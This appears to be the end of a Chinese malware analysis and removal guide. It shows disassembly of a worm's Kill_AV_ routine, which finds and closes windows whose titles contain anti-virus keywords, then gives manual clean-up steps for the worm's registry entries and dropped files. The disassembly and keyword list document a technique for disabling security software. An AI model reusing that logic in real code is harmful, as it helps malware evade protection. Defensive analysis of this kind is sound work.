
```
.nsp0:0040862C
.nsp0:0040862C loc_40862C:                              ; CODE XREF: Kill_AV_+152 j
.nsp0:0040862C     test    ebx, ebx
.nsp0:0040862E     jnz     short loc_4085EA
.nsp0:00408630     call    GetDesktopWindow
.nsp0:00408635     mov     esi, eax
.nsp0:00408637
.nsp0:00408637 loc_408637:                              ; CODE XREF: Kill_AV_+1AF j
.nsp0:00408637     push    0                            ; LPCSTR
.nsp0:00408639     push    0                            ; LPCSTR
.nsp0:0040863B     push    ebx                          ; HWND
.nsp0:0040863C     push    esi                          ; HWND
.nsp0:0040863D     call    FindWindowExA
.nsp0:00408642     mov     ebx, eax
.nsp0:00408644     push    65h                          ; nMaxCount
.nsp0:00408646     push    edi                          ; lpString
.nsp0:00408647     push    ebx                          ; hWnd
.nsp0:00408648     call    GetWindowTextA
.nsp0:0040864D     lea     eax, [ebp+var_7C]
.nsp0:00408650     mov     edx, edi
.nsp0:00408652     mov     ecx, 65h
.nsp0:00408657     call    @System@@LStrFromArray$qqrr17System@AnsiStringpci
.nsp0:0040865C     mov     edx, [ebp+var_7C]
.nsp0:0040865F     mov     eax, offset aI               ; "专杀"
.nsp0:00408664     call    @System@@LStrPos$qqrv
.nsp0:00408669     test    eax, eax
.nsp0:0040866B     jz      short loc_408679
.nsp0:0040866D     push    0                            ; lParam
.nsp0:0040866F     push    0                            ; wParam
.nsp0:00408671     push    12h                          ; Msg
.nsp0:00408673     push    ebx                          ; hWnd
.nsp0:00408674     call    PostMessageA
.nsp0:00408679
.nsp0:00408679 loc_408679:                              ; CODE XREF: Kill_AV_+19F j
.nsp0:00408679     test    ebx, ebx
.nsp0:0040867B     jnz     short loc_408637
.nsp0:0040867D     call    GetDesktopWindow
.nsp0:00408682     mov     esi, eax
.nsp0:00408684
.nsp0:00408684 loc_408684:                              ; CODE XREF: Kill_AV_+1FC j
.nsp0:00408684     push    0                            ; LPCSTR
.nsp0:00408686     push    0                            ; LPCSTR
.nsp0:00408688     push    ebx                          ; HWND
.nsp0:00408689     push    esi                          ; HWND
.nsp0:0040868A     call    FindWindowExA
.nsp0:0040868F     mov     ebx, eax
.nsp0:00408691     push    65h                          ; nMaxCount
.nsp0:00408693     push    edi                          ; lpString
.nsp0:00408694     push    ebx                          ; hWnd
.nsp0:00408695     call    GetWindowTextA
.nsp0:0040869A     lea     eax, [ebp+var_80]
.nsp0:0040869D     mov     edx, edi
.nsp0:0040869F     mov     ecx, 65h
.nsp0:004086A4     call    @System@@LStrFromArray$qqrr17System@AnsiStringpci
.nsp0:004086A9     mov     edx, [ebp+var_80]
.nsp0:004086AC     mov     eax, offset asc_40874C       ; "安全"
.nsp0:004086B1     call    @System@@LStrPos$qqrv
.nsp0:004086B6     test    eax, eax
.nsp0:004086B8     jz      short loc_4086C6
.nsp0:004086BA     push    0                            ; lParam
.nsp0:004086BC     push    0                            ; wParam
.nsp0:004086BE     push    12h                          ; Msg
.nsp0:004086C0     push    ebx                          ; hWnd
.nsp0:004086C1     call    PostMessageA
.nsp0:004086C6
.nsp0:004086C6 loc_4086C6:                              ; CODE XREF: Kill_AV_+1EC j
.nsp0:004086C6     test    ebx, ebx
.nsp0:004086C8     jnz     short loc_408684
.nsp0:004086CA     xor     eax, eax
.nsp0:004086CC     pop     edx
.nsp0:004086CD     pop     ecx
.nsp0:004086CE     pop     ecx
.nsp0:004086CF     mov     fs:[eax], edx
.nsp0:004086D2     push    offset loc_4086EC
.nsp0:004086D7
.nsp0:004086D7 loc_4086D7:                              ; CODE XREF: .nsp0:004086EA j
.nsp0:004086D7     lea     eax, [ebp+var_80]
.nsp0:004086DA     mov     edx, 6
.nsp0:004086DF     call    @System@@LStrArrayClr$qqrpvi
.nsp0:004086E4     retn
.nsp0:004086E4 Kill_AV_ endp ; sp = -94h
```

总结一下实时生病毒病毒部分，这部分病毒主要做了以下事:

1. 实行在机器上的每个分区根目录下生成 `autorun.inf` 和 `sxs.exe` 文件;
2. 实行终止包含以下反病毒相关字样的程序,如果你直接使用专杀之类那么病毒会让你无法开启。

- 防火墙
- 网镖
- 杀毒
- 木马
- 专杀
- 安全

以上两个操作病毒在每两秒钟执行一次，该实在是太无耻了,不能开专杀也不能使用杀毒软件。既然不能用工具杀，那我们根据这篇文章进行手工操作，将病毒清除干净。

### 【手工清除】

根据分析我们可以按以下方式将病毒完美清除:

1. 直接结束 `ergaon.exe` 或者查找窗体名为:`tmlurl`的程序，使病毒退出进程。

2. 删除相应的注册表项:

   - 主键:`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\Explorer`
     删除项:`hx-1`
   - 主键:`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\Explorer`
     删除项:`hx-2`
   - 主键:`HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\New Windows`
     删除项:`PopupMgr`
   - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
     删除项:`tmlurl`

3. 删除各分区根目录下的:`autorun.inf` 和 `sxs.exe`:

   具体方法为:

   3.1、双击打开"我的电脑",然后点"工具"->"文件夹选项"->"查看",然后将"隐藏受保护的操作系统文件"前的色去掉,并将'隐藏文件和文件夹"下的第二个选项"显示所有文件"选上,确定保存。

   3.2、左键相应的分区，然后选择打开(注意不要点自动播放，那样会让病毒再次运行),然后将根目录下的 `sxs.exe` 文件和 `autorun.inf` 文件删除。

4. 删除系统目录下的:`ergaon.exe` 和 `qqhx.dat`;
5. 重启系统后删除系统目录下 `ergaon.dll` 即可。
6. 如果你要做的更好一点，清除完病毒后将 `www.ctv163.com` 加入 `host`。

---

Author:LoveBoom

EMail:Loveboom@163.com

URL:www.Loveboom.net

全文完

`4dd466d0e1e0cc123afbe504da2462ca`
